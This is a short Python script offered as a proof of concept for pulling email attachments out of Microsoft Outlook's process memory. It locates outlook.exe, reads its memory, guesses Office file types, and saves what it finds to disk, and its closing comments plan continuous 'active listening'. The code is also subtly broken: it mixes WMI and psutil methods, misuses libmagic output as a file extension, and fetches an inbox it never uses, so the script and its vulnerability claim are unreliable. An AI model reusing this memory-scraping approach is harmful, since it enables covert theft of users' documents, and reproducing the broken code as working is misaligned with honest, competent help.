import wmi
import psutil
import os
import win32com.client
from winappdbg import Process
from magic import magic_open, magic_file

# objective: proof-of-concept of a possible vulnerability in a Microsoft Outlook add-in which saves attachments to a byte-array, allowing an attacker to extract them from memory.

#this purports to extract such files from the byte array in volatile memory and save them to disk just to show how this could be done


f = wmi.WMI()
# this is to demonstrate the security vulnerability in an easy-to-read language

## the 
outlook = win32com.client.Dispatch("Outlook.Application")
namespace = outlook.GetNamespace("MAPI")
inbox = namespace.GetDefaultFolder(6)

def check_for_outlook(f):
    for process in f.Win32_Process():
        try:
            if "outlook.exe" in process.name().lower():
                pid = process.pid
                exe_path = process.exe()
                for mem in process.memory_maps():
                    if mem.pathname == exe_path and mem.perms == "r":
                        read_process(pid, mem.BaseAddress, mem.len())
        except Exception as e:
            print("Process couldn't be opened:", e)

def read_process(pid, address, length):
    process = Process(pid)
    data = process.read(address, length)
    try:
        with open(os.path.expandvars(f"%USERPROFILE\\Documents\\{pid}.bin"), "wb") as ext_file:
            magic_number = magic_open(flags=0)
            extension = magic_file(magic_number, data[:1024])
            magic_number.close()
            office_exts = ['Microsoft Word 2007+', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1', 'Microsoft PowerPoint 2007+', 'PowerPoint 97-2003', 'Microsoft Office 2007+', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.0', 'Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1']
            if extension in office_exts:
                file_extension = os.path.splitext(extension)[1]
                output_file_name = f"{pid}{file_extension}"
                with open(output_file_name, "wb") as export_file:
                    export_file.write(data)
                print(f"Extraction successful: {output_file_name}")
    except Exception as e:
        print("Couldn't read byte-array:", e)

check_for_outlook(f)
# adjustments to be made:
## - creating a Save As... Window
## - adding in active listening 